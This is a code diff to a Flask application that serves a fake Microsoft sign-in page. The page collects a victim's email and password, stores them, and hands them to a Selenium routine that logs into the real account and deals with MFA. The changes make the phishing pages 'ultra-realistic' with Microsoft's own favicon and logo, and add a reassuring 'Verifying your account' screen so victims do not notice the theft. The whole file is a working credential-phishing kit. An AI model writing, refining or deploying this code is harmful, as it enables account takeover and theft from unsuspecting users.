@@ -13,6 +13,8 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.webdriver.support import expected_conditions as EC
 
+port = int(os.environ.get("PORT", 5000))
+
 # === FLASK APP ===
 app = Flask(__name__)
 
@@ -214,29 +216,62 @@ def auto_login_dynamic_mfa(email, password, otp, totp, session_id):
         except:
             pass
 
-# === REALISTIC FAKE MICROSOFT LOGIN PAGE ===
+# === ULTRA-REALISTIC FAKE MICROSOFT LOGIN PAGE ===
 @app.route('/')
 def index():
     return '''
+    <!DOCTYPE html>
     <html>
-        <head>
-            <title>Sign in to your Microsoft account</title>
-            <style>
-                body { font-family: Segoe UI, sans-serif; background: #f5f5f5; text-align: center; }
-                .login-box { background: white; width: 360px; margin: 100px auto; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-                input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
-                button { width: 100%; padding: 12px; background: #0067b8; color: white; border: none; border-radius: 4px; font-size: 16px; }
-            </style>
-        </head>
-        <body>
-            <div class="login-box">
-                <h2>Sign in</h2>
-                <form action="/password" method="post">
-                    <input type="email" name="email" placeholder="Email, phone, or Skype" required><br>
-                    <button type="submit">Next</button>
-                </form>
-            </div>
-        </body>
+    <head>
+        <title>Sign in to your Microsoft account</title>
+        <link rel="icon" href="https://login.microsoftonline.com/favicon.ico">
+        <style>
+            body {
+                font-family: "Segoe UI", "Helvetica Neue", Helvetica, Arial, sans-serif;
+                background-color: #f5f5f5;
+                text-align: center;
+                padding-top: 50px;
+            }
+            .login-box {
+                background: white;
+                width: 360px;
+                margin: auto;
+                padding: 30px;
+                border-radius: 8px;
+                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            }
+            input {
+                width: 100%;
+                padding: 12px;
+                margin: 10px 0;
+                border: 1px solid #ccc;
+                border-radius: 4px;
+            }
+            button {
+                width: 100%;
+                padding: 12px;
+                background: #0067b8;
+                color: white;
+                border: none;
+                border-radius: 4px;
+                font-size: 16px;
+            }
+            .logo {
+                width: 100px;
+                margin-bottom: 20px;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="login-box">
+            <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" class="logo">
+            <h2>Sign in</h2>
+            <form action="/password" method="post">
+                <input type="email" name="email" placeholder="Email, phone, or Skype" required><br>
+                <button type="submit">Next</button>
+            </form>
+        </div>
+    </body>
     </html>
     '''
 
@@ -247,26 +282,59 @@ def password_page():
     with open(os.path.join(BASE_CACHE_PATH, f"{session_id}_email.txt"), "w") as f:
         f.write(email)
     return f'''
+    <!DOCTYPE html>
     <html>
-        <head>
-            <title>Sign in to your Microsoft account</title>
-            <style>
-                body {{ font-family: Segoe UI, sans-serif; background: #f5f5f5; text-align: center; }}
-                .login-box {{ background: white; width: 360px; margin: 100px auto; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
-                input {{ width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }}
-                button {{ width: 100%; padding: 12px; background: #0067b8; color: white; border: none; border-radius: 4px; font-size: 16px; }}
-            </style>
-        </head>
-        <body>
-            <div class="login-box">
-                <h2>Enter password</h2>
-                <form action="/mfa_check" method="post">
-                    <input type="hidden" name="session_id" value="{session_id}">
-                    <input type="password" name="password" placeholder="Password" required><br>
-                    <button type="submit">Sign in</button>
-                </form>
-            </div>
-        </body>
+    <head>
+        <title>Sign in to your Microsoft account</title>
+        <link rel="icon" href="https://login.microsoftonline.com/favicon.ico">
+        <style>
+            body {{
+                font-family: "Segoe UI", "Helvetica Neue", Helvetica, Arial, sans-serif;
+                background-color: #f5f5f5;
+                text-align: center;
+                padding-top: 50px;
+            }}
+            .login-box {{
+                background: white;
+                width: 360px;
+                margin: auto;
+                padding: 30px;
+                border-radius: 8px;
+                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            }}
+            input {{
+                width: 100%;
+                padding: 12px;
+                margin: 10px 0;
+                border: 1px solid #ccc;
+                border-radius: 4px;
+            }}
+            button {{
+                width: 100%;
+                padding: 12px;
+                background: #0067b8;
+                color: white;
+                border: none;
+                border-radius: 4px;
+                font-size: 16px;
+            }}
+            .logo {{
+                width: 100px;
+                margin-bottom: 20px;
+            }}
+        </style>
+    </head>
+    <body>
+        <div class="login-box">
+            <img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" class="logo">
+            <h2>Enter password</h2>
+            <form action="/mfa_check" method="post">
+                <input type="hidden" name="session_id" value="{session_id}">
+                <input type="password" name="password" placeholder="Password" required><br>
+                <button type="submit">Sign in</button>
+            </form>
+        </div>
+    </body>
     </html>
     '''
 
@@ -286,7 +354,21 @@ def mfa_check():
     thread = threading.Thread(target=auto_login_dynamic_mfa, args=(email, password, None, None, session_id))
     thread.start()
 
-    return "<h2>Login in progress... You may close this window.</h2>"
+    return '''
+    <html>
+        <head>
+            <title>Verifying your account</title>
+            <style>
+                body { font-family: "Segoe UI", sans-serif; text-align: center; padding-top: 100px; }
+            </style>
+        </head>
+        <body>
+            <h2>Verifying your account...</h2>
+            <img src="https://i.gifer.com/ZZ5H.gif" width="50">
+            <p>You may close this window.</p>
+        </body>
+    </html>
+    '''
 
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
+    app.run(host="0.0.0.0", port=port)
